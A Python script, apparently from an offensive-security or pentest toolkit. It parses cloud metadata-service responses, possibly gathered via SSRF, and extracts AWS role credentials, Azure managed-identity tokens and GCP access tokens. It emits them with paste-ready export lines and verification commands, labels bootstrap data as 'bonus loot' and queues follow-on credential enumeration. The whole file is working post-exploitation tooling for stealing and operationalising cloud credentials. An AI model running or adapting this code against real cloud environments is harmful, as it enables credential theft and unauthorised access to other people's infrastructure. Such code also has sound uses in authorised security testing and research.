#!/usr/bin/env python3
"""Parse saved metadata-service responses into credentials + rupu work units.

Reads the metadata-raw.json written by metadata_pivot.py (or hand-built:
{"provider": "...", "responses": {label: {"url","status","body"}}}), extracts
AWS role credentials, Azure bearer tokens, and GCP access tokens, and writes:

  - credentials.json : parsed creds with ready-to-paste export lines
  - work-units.json  : BARE JSON ARRAY of {"id","title","targets","hints"} —
                       one unit per credential, next_skill=cloud-credential-enumeration
  - assets.json      : asset list (cloud-account / principal / compute-instance /
                       secret) for coverage-assets' assets.mark

Example:
  python3 scripts/parse_metadata_creds.py out/metadata-raw.json \
      -o out/work-units.json --creds out/credentials.json --assets out/assets.json
"""
import argparse
import base64
import json
import os
import sys


def jwt_claims(tok):
    try:
        pay = tok.split(".")[1]
        pay += "=" * (-len(pay) % 4)
        return json.loads(base64.urlsafe_b64decode(pay))
    except Exception:
        return {}


def jload(body):
    try:
        return json.loads(body)
    except Exception:
        return None


def main():
    p = argparse.ArgumentParser(
        description="metadata-raw.json -> credentials + rupu work units.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("raw", help="metadata-raw.json from metadata_pivot.py")
    p.add_argument("-o", "--out", default="out/work-units.json")
    p.add_argument("--creds", default="out/credentials.json")
    p.add_argument("--assets", default=None)
    args = p.parse_args()

    store = json.load(open(args.raw))
    provider = store.get("provider", "unknown")
    resp = store.get("responses", {})
    ok = {k: v for k, v in resp.items()
          if v.get("status") and 200 <= v["status"] < 300 and v.get("body")}

    creds, units, assets = [], [], []
    account = None

    # context: AWS identity doc
    idoc = jload(ok.get("aws-identity-doc", {}).get("body", "")) or {}
    if idoc.get("accountId"):
        account = idoc["accountId"]
        assets.append({"kind": "cloud-account", "id": account,
                       "attrs": {"provider": "aws", "region": idoc.get("region", ""),
                                 "via": "instance-identity-document"}})
    if idoc.get("instanceId"):
        assets.append({"kind": "compute-instance", "id": idoc["instanceId"],
                       "attrs": {"provider": "aws", "region": idoc.get("region", "")}})

    for label, r in ok.items():
        body = r["body"]

        # ---- AWS role / ECS task credentials ----
        if label.startswith("aws-credentials:"):
            d = jload(body)
            if not d or "AccessKeyId" not in d:
                continue
            role = label.split(":", 1)[1]
            arn = (d.get("RoleArn") or "")  # ECS endpoint includes RoleArn
            ident = arn or ("role/" + role)
            creds.append({
                "provider": "aws", "identity": ident, "role": role,
                "access_key_id": d["AccessKeyId"],
                "secret_access_key": d.get("SecretAccessKey", ""),
                "session_token": d.get("Token", ""),
                "expiration": d.get("Expiration", ""),
                "export": "export AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s"
                          % (d["AccessKeyId"], d.get("SecretAccessKey", ""), d.get("Token", "")),
                "verify": "aws sts get-caller-identity",
            })
            units.append({
                "id": "mdp-%04d" % len(units),
                "title": "AWS credentials for %s via metadata service" % ident,
                "targets": [ident] + ([account] if account else []),
                "hints": {"provider": "aws", "credential_type": "sts-session",
                          "role": role, "expiration": d.get("Expiration", ""),
                          "cred_ref": "%s#%s" % (args.creds, len(creds) - 1),
                          "source_url": r.get("url", ""),
                          "via_ssrf": str(store.get("via_ssrf", False)).lower(),
                          "next_skill": "cloud-credential-enumeration"}})
            assets.append({"kind": "principal", "id": ident,
                           "attrs": {"provider": "aws", "type": "iam-role",
                                     "access_key_id": d["AccessKeyId"]}})
            assets.append({"kind": "secret", "id": "aws-sts:" + d["AccessKeyId"],
                           "attrs": {"provider": "aws", "identity": ident,
                                     "expires": d.get("Expiration", "")}})

        # ---- Azure bearer token ----
        elif label.startswith("azure-token:"):
            d = jload(body)
            if not d or "access_token" not in d:
                continue
            tok = d["access_token"]
            cl = jwt_claims(tok)
            ident = cl.get("xms_mirid") or cl.get("oid", "managed-identity")
            creds.append({
                "provider": "azure", "identity": ident,
                "tenant": cl.get("tid", ""), "resource": d.get("resource", ""),
                "access_token": tok, "expires_on": d.get("expires_on", ""),
                "export": "TOKEN=%s" % tok,
                "verify": "az rest --method get --url "
                          "'https://management.azure.com/subscriptions?api-version=2020-01-01' "
                          "--headers \"Authorization=Bearer $TOKEN\" --skip-authorization-header",
            })
            if cl.get("tid"):
                assets.append({"kind": "cloud-account", "id": cl["tid"],
                               "attrs": {"provider": "azure", "type": "tenant"}})
            units.append({
                "id": "mdp-%04d" % len(units),
                "title": "Azure managed-identity token (%s) for %s"
                         % (d.get("resource", "?"), ident),
                "targets": [ident] + ([cl["tid"]] if cl.get("tid") else []),
                "hints": {"provider": "azure", "credential_type": "bearer-token",
                          "resource": d.get("resource", ""),
                          "tenant": cl.get("tid", ""),
                          "expires_on": str(d.get("expires_on", "")),
                          "cred_ref": "%s#%s" % (args.creds, len(creds) - 1),
                          "via_ssrf": str(store.get("via_ssrf", False)).lower(),
                          "next_skill": "cloud-credential-enumeration"}})
            assets.append({"kind": "principal", "id": ident,
                           "attrs": {"provider": "azure", "type": "managed-identity"}})

        # ---- GCP access token (v1 and legacy v1beta1) ----
        elif label.startswith("gcp-token"):
            d = jload(body)
            if not d or "access_token" not in d:
                continue
            sa = label.split(":", 1)[1] if ":" in label else "default"
            email = ok.get("gcp-email:" + sa, {}).get("body", sa).strip()
            scopes = ok.get("gcp-scopes:" + sa, {}).get("body", "").split()
            creds.append({
                "provider": "gcp", "identity": email, "scopes": scopes,
                "access_token": d["access_token"],
                "expires_in": d.get("expires_in", 0),
                "export": "export CLOUDSDK_AUTH_ACCESS_TOKEN=%s" % d["access_token"],
                "verify": "gcloud projects list",
            })
            proj = email.split("@")[1].split(".")[0] if "@" in email else ""
            if proj:
                assets.append({"kind": "cloud-account", "id": proj,
                               "attrs": {"provider": "gcp", "type": "project"}})
            units.append({
                "id": "mdp-%04d" % len(units),
                "title": "GCP service-account token for %s" % email,
                "targets": [email] + ([proj] if proj else []),
                "hints": {"provider": "gcp", "credential_type": "oauth-access-token",
                          "scopes": ",".join(scopes),
                          "expires_in": str(d.get("expires_in", "")),
                          "cred_ref": "%s#%s" % (args.creds, len(creds) - 1),
                          "via_ssrf": str(store.get("via_ssrf", False)).lower(),
                          "next_skill": "cloud-credential-enumeration"}})
            assets.append({"kind": "principal", "id": email,
                           "attrs": {"provider": "gcp", "type": "service-account",
                                     "scopes": ",".join(scopes)}})

        # ---- bonus loot flags ----
        elif label in ("aws-user-data", "gcp-startup-script", "azure-user-data"):
            assets.append({"kind": "secret", "id": label,
                           "attrs": {"note": "bootstrap data captured — scan with "
                                             "trufflehog filesystem",
                                     "raw_ref": args.raw}})

    for path, data in ((args.creds, creds), (args.out, units)):
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
            fh.write("\n")
    sys.stderr.write("[*] %d credentials -> %s\n" % (len(creds), args.creds))
    sys.stderr.write("[*] %d work units -> %s\n" % (len(units), args.out))
    if args.assets:
        os.makedirs(os.path.dirname(args.assets) or ".", exist_ok=True)
        with open(args.assets, "w") as fh:
            json.dump(assets, fh, indent=2)
            fh.write("\n")
        sys.stderr.write("[*] %d assets -> %s\n" % (len(assets), args.assets))
    if not creds:
        sys.stderr.write("[-] no credentials parsed — check raw responses for "
                         "header requirements / IMDSv2 enforcement (see "
                         "references/endpoints.md SSRF shaping)\n")


if __name__ == "__main__":
    main()
